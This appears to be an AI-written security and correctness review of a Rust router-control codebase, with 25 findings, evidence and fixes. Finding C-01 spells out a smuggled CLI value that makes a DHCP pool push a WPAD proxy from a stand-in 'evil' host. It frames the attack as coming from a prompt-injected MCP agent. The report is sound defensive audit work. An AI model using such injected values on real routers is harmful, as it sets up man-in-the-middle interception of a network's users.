I read every file in scope and found 1 high, 13 medium and 11 low findings. The highest-risk problem is that free text is written unquoted into router CLI lines. An MCP client with only the Write role can use that to send pool commands no curated tool offers, with no catalog check on them. In the safety bracket, the open-bracket count is balanced on every path. Two bracket problems matter more: the disarm can be refused before it is sent, and the bracket cancels a recovery timer the operator armed earlier. I made no changes and ran no cargo commands.

### C-01 Unquoted free text in DHCP and client CLI lines lets a Write principal inject router CLI arguments
- severity: high
- kind: security
- rule: project rule (b) "Raw RCI input is validated before sending"; RUST_GUIDELINES.md §10 "Validate and sanitize all external input at system boundaries" (2732)
- evidence: `crates/kcc-domain/src/dhcp/command.rs:64-65`
  ```rust
  "ip dhcp host" => Ok(format!("ip dhcp host {}", text("host")?)),
  "ip dhcp pool" => Ok(format!("ip dhcp pool {}", text("name")?)),
  ```
  `crates/kcc-domain/src/dhcp.rs:155-158`: `json!({"host":format!("{mac} {address}")})`, where `mac` is a plain `&str`.
  `crates/kcc-domain/src/clients/command.rs:133`: `"known host" => Ok(format!("known host {} {}", text("name")?, text("mac")?)),`
  - The catalog types these as `String` (`catalog/5.1/known.json` `known host` name; `ip.json` `ip dhcp pool` name and `ip dhcp host` host). `kcc-catalog/src/validate.rs:301` checks such values only with `value.is_string()`.
  - The MCP inputs pass `text()`, which allows spaces and quotes (`kcc-mcp/src/support/validate.rs:39-44`): `kcc-mcp/src/domains/write/clients.rs:236-247` (pool name, static-lease mac) and `:174` (register name).
  - Other planners in the crate use `cli_token::validate` or `cli_token::quoted`. These three do not.
- impact: The domain renders pool subcommands inline (`ip dhcp pool {pool} range …`), so the router accepts arguments after the pool name. Suppose a prompt-injected MCP agent with only Write sends the DHCP `pool` op with `name = "_WEBADMIN wpad http://evil/wpad.dat"`. The first line sent is then `ip dhcp pool _WEBADMIN wpad http://evil/wpad.dat`, which pushes WPAD (or a DHCP `option`) to every LAN client. That is a man-in-the-middle setup that no curated op offers, sent without RawRci and without a catalog check. `verification::complete` accepts it because the line parses as a single row.
- fix: Quote these values with `cli_token::quoted` (as wifi, wan and mesh do), or reject them with `cli_token::validate`. Make `plan_static_lease` take a typed MAC.
- confidence: medium (INFERRED: the real router CLI treats words after `ip dhcp pool <name>` as a subcommand. The domain's own rendering depends on exactly that.)

### C-02 The bracket's disarm runs the full write preflight, so a local refusal blocks cleanup and is reported as "may be armed"
- severity: medium
- kind: bug
- rule: overlay keenetic-control-center (owner's bracket invariants "disarm always attempted" and "a failure never reads as armed when the timer is off", `bracket.rs:9-23`)
- evidence: `crates/kcc-domain/src/configuration.rs:271-273` sends the disarm through `changes.apply_cli(request)`. In `kcc-app/src/workflow.rs`, `apply_cli` first calls `prepare_cli` (`1124`), which runs authorize, conflict check and backup (`1265-1269`):
  ```rust
  if current.checksum != self.expected.checksum && current.agent != self.expected.agent {
      return Err(WorkflowError::Conflict { agent: current.agent });
  ```
  (`1341-1344`). `recovery.rs:113-116` maps a disarm failure after a failed arm to `ArmedFate::NotSent`. Its message (`common.ftl:44`) says "the router may still be counting down".
- impact:
  - Another agent edits the router after the change set starts. The arm is refused locally with Conflict, and so is the disarm. Nothing was sent, but the user is told a rollback timer may be counting down. The same happens with a failed backup download.
  - A foreign edit during the work makes the disarm fail its conflict check, so it is never sent. The router timer then fires after 300 s and discards all unsaved changes, including the other admin's.
- fix: Send the disarm (and keep-alive) through a path that skips the conflict and backup preflight and keeps the authorization. Have `arm_failed` report `None` when the arm failed before anything was sent.
- confidence: high

### C-03 `guarded` replaces and then cancels a recovery timer the operator armed earlier
- severity: medium
- kind: bug
- rule: none (safety-bracket correctness)
- evidence: `crates/kcc-domain/src/configuration/bracket.rs:112-137` arms (`SafetyNet::arm … MANAGEMENT_SECONDS`) and always disarms without reading `changes.baseline().fail_safe`. `SafetyMode::decide` (`configuration.rs:103-121`) checks only that `active` is a boolean, never that it is `true`.
- impact: An operator arms `kcc config failsafe arm 3600` as a safety net, then makes a management change in the Web UI. The bracket resets the timer to 300 s and then sends `no system configuration fail-safe timer`, so the operator's net is silently gone. In scheduled-reboot mode, `no system reboot` likewise cancels a reboot the operator scheduled.
- fix: When the baseline shows `fail-safe.active == true`, either refuse the bracket or run the work without arming or disarming and leave the existing timer to its owner.
- confidence: medium (INFERRED: the router resets an already-armed timer on a new arm.)

### C-04 Generic interface reads pass `show interface` credential blobs (ns3) through `extra`
- severity: medium
- kind: security
- rule: project rule (d) "Secrets … never reach logs, … tool results, error text or Debug output"
- evidence: `crates/kcc-domain/src/interfaces/models.rs:35-37` keeps everything else: `#[serde(flatten)] pub extra: BTreeMap<String, Value>`. By contrast, `wan/models.rs:76-77,83-91` and `wifi/models.rs:43-44` drop `authentication` explicitly. The planners prove the field exists: `wan.rs:180-182` and `wifi/plan.rs:72-74` read `"/{name}/authentication/password/ns3"` and `"/{name}/authentication/wpa-psk/ns3"` back from `show interface`. `kcc-config/src/ns3.rs:1` is "NDM Secure v3 password encoding and decoding", so the blob is reversible. `kcc/src/cli/dom_wire.rs:146,152` → `domains.rs:187-200` prints the whole document.
- impact: `kcc interfaces list --json` prints PPPoE passwords and Wi-Fi PSKs in a decodable form, without the `RevealSecrets` permission. MCP is protected only by the key-name redaction in `kcc-mcp/src/support/shape.rs:207-236`.
- fix: Drop `authentication` from `Interface` at the read boundary, as WAN and Wi-Fi already do.
- confidence: medium (INFERRED: a real router returns the blob. The fake returns `"ns3": true`.)

### C-05 Management detection blocks on DNS inside async code and quietly falls back to Write
- severity: medium
- kind: guideline
- rule: RUST_GUIDELINES.md §5 "DON'T: Call blocking I/O in async functions" (1112); overlay project rule (a) "each target is resolved once and pinned"
- evidence: `crates/kcc-domain/src/interfaces/management.rs:206-209`
  ```rust
  (host.as_str(), 0_u16).to_socket_addrs().map_or_else(
      |_error| BTreeSet::new(),
  ```
  This runs inside `async fn detect` (`41-45`). `classify_generated` calls `detect` once per interface (`114-118`), and `observed_sources` drops every read error (`182-196`). `risk()` falls back to Management only for the literal name `Bridge0` (`33-34`).
- impact: For a router registered by host name, every check does a blocking `getaddrinfo` on a tokio worker thread. The result can also differ from the pinned address the client actually uses. If DNS fails or ARP and hotspot reads fail, the verdict becomes `Unknown`, which is plain `Write` for any bridge other than `Bridge0`. Taking down the bridge kcc uses then runs with no recovery timer.
- fix: Use the client's pinned peer address instead of re-resolving. Treat an empty host set or empty evidence as Management for every bridge, not only `Bridge0`.
- confidence: high for the blocking call; medium for the lockout path.

### C-06 Several WAN planners hard-code `Risk::Write` even on the interface that carries management
- severity: medium
- kind: bug
- rule: none (risk classification)
- evidence: `crates/kcc-domain/src/wan.rs:228-237` (`plan_mtu … Risk::Write`), `240-258` (`plan_default_route`), `195-208` (`plan_connect_via`), `156-165` (`plan_identity`) and `168-191` (`plan_password`) all fix `Risk::Write`. By contrast, `plan_dhcp`/`plan_static_address` use `verdict.risk(name)` (`123-153`), and `plan_priority`/`create`/`delete` run `classify_generated` (`212-225`, `289-307`).
- impact: When kcc manages a router over its PPPoE WAN address, `no interface PPPoE0 ipcp default-route`, a bad MTU or wrong PPPoE credentials cut kcc off with no recovery timer. The unsaved change stays until someone power-cycles the router.
- fix: Classify these the same way as `plan_priority` (`plan_named_generated`), or take a `ManagementVerdict`.
- confidence: high (code); medium (how common WAN management is)

### C-07 Validated requests are overwritten after validation, bypassing the catalog check
- severity: medium
- kind: security
- rule: project rule (b); RUST_GUIDELINES.md §3 "Force construction through validated constructors" (424)
- evidence: `crates/kcc-domain/src/keendns.rs:168-169`
  ```rust
  let mut upstream = validate(router, "ip http proxy upstream", &json!({}))?;
  upstream.value = json!({"protocol":protocol,"host":host,"port":port});
  ```
  The same pattern is at `keendns.rs:184-185` and `services.rs:214-215`. The catalog types `ip http proxy upstream` as `fqdn|ip(IpAddress)|mac(MacAddress)|port(Integer)`, and `cloud control2 security-level` / `ip * security-level` as a `level` Keyword.
- impact: For the proxy upstream, `protocol` and `host` reach the router CLI checked only by `validate_token`. Any host, including non-LAN or metadata addresses, can become a published KeenDNS upstream, although the docs say "one LAN host". The rendered shape (`upstream <protocol> <host> <port>`) also does not match the catalog grammar.
- fix: Validate the real body. Where the catalog shape is wrong, fix the catalog overlay instead of mutating `ValidatedRequest.value`. Make that field read-only in kcc-catalog.
- confidence: high

### C-08 `parse_pools` attaches indented lines of later blocks to the last DHCP pool
- severity: medium
- kind: bug
- rule: none
- evidence: `crates/kcc-domain/src/dhcp/model.rs:175-187`
  ```rust
  [field @ ("range" | "default-router" | "dns-server" | "lease" | "bind" | "enable"), rest @ ..]
      if line.starts_with(' ') => {
      if let Some(pool) = pools.last_mut() { apply_pool_field(pool, field, rest); }
  ```
  A new top-level line (`_ => {}`) never closes the current pool.
- impact: A later block such as `ipv6 subnet Default` with `    bind Bridge0`, or any block with an indented `enable`, overwrites the last pool's `interface` or `enabled`. The DHCP page then shows the wrong binding. `plan_static_lease` (`dhcp.rs:130-135`) also runs its subnet check against the wrong bridge, so it wrongly accepts or refuses leases.
- fix: Clear the current pool on any non-indented line that is not an `ip dhcp pool` header.
- confidence: medium (INFERRED: real block order. The fixtures contain no pool lines, so nothing tests this.)

### C-09 `plan_pool` silently drops every DNS server after the first
- severity: medium
- kind: bug
- rule: project rule (c) "Every curated write is read back and compared"
- evidence: `crates/kcc-domain/src/dhcp.rs:107-112`: `if let Some(address) = pool.dns_servers.first() { … "address1" … }`. `PoolConfig::with_dns_servers(Vec)` (`dhcp/model.rs:140-143`) accepts any number, and the Web form passes a list (`kcc-web/src/clients_pages/dhcp_forms.rs:140`).
- impact: An operator enters two DNS servers. Only the first is written, read-back checks only that line, and the change is reported as applied.
- fix: Refuse more than the catalog supports (`address1` only), or render all of them.
- confidence: high

### C-10 Partition check and format can never work, yet ship in Web, MCP and CLI
- severity: medium
- kind: dead-code
- rule: none
- evidence:
  - `crates/kcc-domain/src/storage.rs:186-199` validates `"system partition check"` / `"system partition format"`. No catalog has those paths; 5.1 has `media partition check|format` (`catalog/5.1/media.json`).
  - `verification.rs:28-31` exempts `"media partition check"`, which this planner never uses.
  - `tests/readback/storage.rs:13-35` pins "always `Validation`".
  - `verification_coverage.rs:96-99` skips unavailable writes, so the registry guard never flags them.
  - Callers: `kcc-web/src/system_pages/storage_actions.rs:138,217`, `kcc-mcp/src/domains/write/housekeeping.rs:132`, `kcc/src/cli/dom_admin.rs:172-177`.
- impact: Every surface offers storage maintenance that always fails, and the tests lock in that failure.
- fix: Map to the real `media partition …` paths, or remove the feature.
- confidence: high

### C-11 The component commit job reports "completed" before the router reboots
- severity: medium
- kind: bug
- rule: project rule (c)
- evidence: `crates/kcc-domain/src/components/commit.rs:66-81`. After sending `components commit`, the first `poll_info` that succeeds returns `completed` with `after`. Nothing waits for the router to go down and come back, or checks that the components changed.
- impact: A real router keeps answering while it downloads and flashes. The job finishes at once with `after_firmware` and `after_components` equal to the old state, and then the router reboots. The test (`tests/components.rs:57-73`) checks a fresh `poll_info` after the job ends, not the job's own report, so it passes anyway.
- fix: Require one failed probe (down) before accepting a successful one, and compare the components against what was staged.
- confidence: medium (INFERRED: the router stays reachable for a while after the commit.)

### C-12 Changing the listener kcc itself uses always rolls back the router
- severity: medium
- kind: bug
- rule: none
- evidence: `crates/kcc-domain/src/services.rs:198-205` (`ip http port`) and `220-231` (`ip http ssl enable/port/redirect`) both plan `Risk::Management`. `kcc-app/src/workflow.rs:1138-1141` then reads back and reads `show last-change` through the old endpoint, and the bracket's disarm also uses the old endpoint.
- impact: If kcc connects on that port or scheme, the verification and the disarm both fail. Redirects are refused by outbound policy. The router timer then restores the saved configuration and discards every unsaved change, not only this one. The operation can never succeed, but the planner still accepts it.
- fix: Refuse it in the planner when the target listener is the one in the router profile's URL, or document that a profile edit must come first.
- confidence: medium (INFERRED: the router applies the change immediately.)

### C-13 Local planning errors are reported as "invalid router response"
- severity: medium
- kind: guideline
- rule: RUST_GUIDELINES.md §2 "Propagate errors with `?`" (228); BRIEF §4 "swallowed or downgraded errors"
- evidence:
  - `crates/kcc-domain/src/configuration.rs:249-250,271-272,290-291`: `.map_err(|_error| WorkflowError::InvalidResponse)`
  - `system.rs:205-206`, `clients.rs:225` and `dhcp.rs:169` do the same.
  - `configuration.rs:352-370` formats `seconds` into a line and parses it back out (`split_whitespace().next_back().parse::<u64>()`).
- impact: A catalog `Validation { issues }` or an `InvalidCliToken` from the arm, reboot or client/DHCP plan reaches the user as a router failure, with the issues thrown away. Inside the bracket, a locally refused arm reads as a transport-level failure.
- fix: Add a `WorkflowError` (or domain) variant that carries the planning error. Build the arm body from typed `seconds` instead of re-parsing the line.
- confidence: high

### C-14 Module- and crate-wide `#[expect]`s hide real defects
- severity: medium
- kind: guideline
- rule: AGENTS.md "No `#[allow]` … `#[expect]` on the narrowest item"; RUST_GUIDELINES.md §9 "Satisfying the profile" (2054-2055, 2090)
- evidence:
  - `crates/kcc-domain/src/lib.rs:2-5` puts `clippy::missing_errors_doc` on the whole crate.
  - `system.rs:2-8` and `interfaces.rs:2-8` add module-wide `needless_pass_by_value` and `missing_inline_in_public_items`. The same pattern is in 16 more domain modules.
  - Hidden by these: `system.rs:283-289` `_rci_path: Vec<&str>` is allocated by every caller and never used, while `change_request` (`176-187`) re-derives the RCI path by matching strings. `wan.rs:276-285` has an unused `_name: &ObjectName`.
- impact: New public functions in these modules ship without `# Errors` docs or `#[inline]` and nobody is warned, and the lint that would have caught the dead parameters is silenced.
- fix: Delete the dead parameters, write the `# Errors` sections, and put any remaining expectation on the single item that needs it.
- confidence: high

### C-15 `close(Save)` in router mode sends a second save after the commit and can misreport the result
- severity: low
- kind: bug
- rule: none
- evidence: `crates/kcc-domain/src/configuration/close.rs:82-83` runs `changes.commit()` and then `changes.save().await.map_err(Failure::committed)`. `workflow.rs:1180-1188` shows `commit` already waits until `unsaved` clears.
- impact: If the redundant save fails (for example a Conflict from its own pre-check), the CLI says `MIGRATE_COMMITTED_NOT_SAVED` (`kcc/src/cli/closing.rs:39-41`) although the startup config is already saved.
- fix: Drop the second save in router mode, or verify `unsaved == false` instead.
- confidence: medium

### C-16 `close` doc gives the wrong fate for a failed keep-unsaved
- severity: low
- kind: docs
- rule: none
- evidence: `close.rs:55-56` says keep-unsaved disarm failure is "armed with `ArmedFate::Saved`". The code calls `recovery::finish(Ok(..), disarm)` (`73-79`), which sets `applied = true` and yields `ArmedFate::Applied` (`recovery.rs:128,155-158`).
- impact: Callers that follow the doc show "configuration saved" for a run that was never saved.
- fix: Correct the doc to `Applied`.
- confidence: high

### C-17 The same helpers are copied across planners
- severity: low
- kind: duplication
- rule: BRIEF §4 "copy-paste duplication that drifts"
- evidence:
  - JSON-pointer escaping `replace('~', "~0").replace('/', "~1")` appears 7 times: `interfaces.rs:262`, `wan.rs:177`, `wan/verification.rs:18`, `wifi/plan.rs:41,69`, `clients/command.rs:78`, `keendns/verification.rs:42`.
  - `validate_token` is copied in full in `logging.rs:241-251`, `schedules.rs:260-270` and `storage.rs:290-300`, although `cli_token::validate` exists.
  - `fn validate(router, path, body)` appears 8 times.
  - About 20 local descriptor builders exist although `descriptor::operation` does the job.
  - `map_domain_error` is identical in `clients/command.rs:204-222` and `dhcp.rs:245-263`.
  - The "first non-`no` argument" renderer is duplicated in `components.rs:197-214` and `services.rs:284-306`.
- impact: A fix to the token rules or the escaping has to be found and applied up to seven times. The copies can already drift: the `ValidatedRequest` refusals behave differently from module to module.
- fix: Move them into `cli_token`, `descriptor` and one `pointer::escape` helper.
- confidence: high

### C-18 Production code that only tests use, or that does nothing
- severity: low
- kind: dead-code
- rule: BRIEF §4 "dead or test-only code shipped in production", "string matching on error names"
- evidence:
  - `crates/kcc-domain/src/interfaces/guard.rs:33-43`: `is_fail_safe_unarmed` string-matches `field == "/fail-safe/active"`, which duplicates the literal in `configuration.rs:383`. Its only caller is `tests/interfaces.rs:188`.
  - `guard.rs:67-70` reads `show last-change` again after `apply_cli` already did (`workflow.rs:1141`).
  - `wifi.rs:117-126` (`ns3_presence`) and `wifi/models.rs:110-133` (`Ns3Presence`) are used only in tests.
  - `configuration.rs:298-300,312-314` (`SafetyNet::commit`, `save`) only forward to `ChangeSet`.
- impact: Extra public surface, an extra router request on every management interface change, and a check that is never true in production.
- fix: Delete them, or move them to test support.
- confidence: high

### C-19 Diagnostics poll the router every 10 ms
- severity: low
- kind: anti-pattern
- rule: BRIEF §2 "DoS bounds"
- evidence: `crates/kcc-domain/src/diagnostics.rs:212` sets `.with_poll_interval(Duration::from_millis(10))`, overriding the 1 s default (`kcc-rci/src/engine/background.rs:100-106,129`).
- impact: An iperf3 or traceroute job sends about 50-100 GETs per second for its whole run. That loads the router's HTTP daemon, skews the iperf3 measurement it is running, and takes request permits from other work on the same router.
- fix: Keep the default interval in production and shorten it only in tests (or use a paused clock).
- confidence: high

### C-20 Schedule descriptions cannot contain spaces
- severity: low
- kind: bug
- rule: none
- evidence: `crates/kcc-domain/src/schedules.rs:139` runs `validate_token(description)?`, which rejects whitespace, and line `183` renders the description unquoted. Interface descriptions use `cli_token::quoted_text` (`interfaces.rs:294`).
- impact: "Night mode" is refused with `InvalidCliToken`.
- fix: Use `quoted_text` for the description.
- confidence: high

### C-21 The bracket reports refusals with the wrong error and drops an audit failure
- severity: low
- kind: anti-pattern
- rule: RUST_GUIDELINES.md §2 (228)
- evidence: `crates/kcc-domain/src/configuration/bracket.rs:109-110`: `if !hold() { return Err(refused(WorkflowError::Audit(AuditError::WriterUnavailable))); }`. Line `117`: `drop(changes.settle_audit(BRACKET_AUDIT_WAIT).await);`.
- impact: A request that is no longer held is logged as a dead audit writer. On the arm-failure path, an audit writer failure is thrown away silently, unlike the main path (`131-135`).
- fix: Add a dedicated "unowned" variant, and fold the settle error into the arm failure.
- confidence: high

### C-22 Read-back of secret writes passes when an old secret is already there
- severity: low
- kind: bug
- rule: project rule (c)
- evidence: `router_users.rs:161-169` checks only `"/password/md5"` with `LengthRange{32,32}`. `wifi/plan.rs:72-79` and `wan.rs:180-187` check the `ns3` marker or length.
- impact: A router that acknowledges but ignores a password or PSK change still passes verification whenever a previous secret exists.
- fix: Read the hash or marker before the write and require it to change.
- confidence: high

### C-23 Client and DHCP read-back runs after the audit entry says "success"
- severity: low
- kind: bug
- rule: project rule (c)
- evidence: `clients.rs:226-227` and `dhcp.rs:170-193` run their read-back after `apply_cli`, which has already written the audit entry with outcome `success` (`workflow.rs:1151-1153`).
- impact: A failed host or lease read-back returns `VerificationFailed`, but the audit log still records success.
- fix: Pass these checks as `VerificationSpec`s into `apply_cli`.
- confidence: high

### C-24 `plan_tag` does not protect the login kcc uses
- severity: low
- kind: bug
- rule: none
- evidence: `router_users.rs:128-133` blocks only `admin` losing `cli`. `plan_password` and `plan_delete` take `profile_login` (`146-155`, `180-184`); `plan_tag` does not.
- impact: Removing `http` from, or adding `readonly` to, kcc's own login locks kcc out. The recovery timer then rolls back all unsaved changes.
- fix: Take `profile_login` and refuse tag changes that would remove kcc's own access.
- confidence: medium

### C-25 Tests that cannot fail or miss the behavior they name
- severity: low
- kind: test-quality
- rule: RUST_GUIDELINES.md §13 (3482)
- evidence:
  - `tests/system.rs:117-131` builds a `FakeRouter` that is never wired in, then asserts `request_count() == 0` after calling a pure function.
  - `tests/components.rs:65-73` checks a fresh `poll_info`, not the job's `after_*` payload.
  - `verification_coverage.rs:96-99` skips unavailable writes, which hides C-10.
  - The administration rows only assert `verify` is non-empty (`administration.rs:142-145`).
- impact: Regressions in factory-reset gating, the commit report (C-11) and planner paths that do not exist (C-10) pass the tests.
- fix: Call `factory_reset` against the fixture, assert the job's progress payload, and fail on registry writes the catalog does not have.
- confidence: high

## Coverage
- **Read in full (source):** `lib.rs`, `descriptor.rs`, `cli_token.rs`, `verification.rs`, `configuration.rs` plus `configuration/{bracket,recovery,close,apply_needs}.rs`, `internet.rs`, `mesh.rs`, `storage.rs`, `diagnostics.rs`, `system.rs` plus `system/*`, `clients.rs` plus `clients/command.rs`, `dhcp.rs` plus `dhcp/*`, `components.rs` plus `components/commit.rs`, `router_users.rs` plus `router_users/verification.rs`, `services.rs` plus `services/verification.rs`, `keendns.rs` plus `keendns/verification.rs`, `logging.rs` plus `logging/verification.rs`, `schedules.rs` plus `schedules/verification.rs`, `interfaces.rs` plus `interfaces/*`, `wan.rs` plus `wan/*`, `wifi.rs` plus `wifi/*`.
- **Read in full (tests):** `bracket.rs`, `interfaces.rs`, `clients.rs`, `components.rs`, `system.rs`, `readback.rs`, `readback/storage.rs`, `storage.rs`, `verification_coverage.rs`, `verification_coverage/tests/{execution,administration}.rs`.
- **Skimmed:** tests `wifi.rs`, `wan.rs`, `dhcp.rs` (grep only), `readback/model.rs` (first 60 lines), `readback/access.rs` (grep only).
- **Out-of-scope code read for context:** `kcc-app/src/{brackets.rs, workflow.rs 380-439, 730-860, 1100-1420, workflow_verify.rs 1-200}`, `kcc-rci/src/engine/background.rs`, `kcc-catalog/src/validate.rs 280-347`.
- **Not read:** `verification_coverage/tests/{network,vpn}.rs`, `readback/{network,system,access}.rs` in full.

## Clean
- Open-bracket count: entered before the arm and left by guard drop on every return, on unwind and on drop; the panic test proves it.
- Permission: the same `permission` reaches arm, work and disarm.
- `SafetyMode::decide`: matches the owner's recovery-mode table exactly, including the boolean `fail-safe.active` rule.
- Outcome precedence: `recovery::finish_applied` keeps both the work outcome and the armed state.
- `SafetyNet::required` and `apply_permissions`: correct and tested.
- Wi-Fi and WAN planners: they quote free text, use `ObjectName` for interfaces, and read back each field.
- `ObjectName`: the charset is restricted (`[A-Za-z0-9_./:-]`), so interface names cannot inject CLI.
- Secret-bearing CLI lines: they use `from_template` placeholders, and the WAN and Wi-Fi read models drop `authentication`.
- `verification::complete`: the single-row parse check stops newline injection into the lines it checks.
- `membership::merge`: malformed membership is refused, not treated as empty.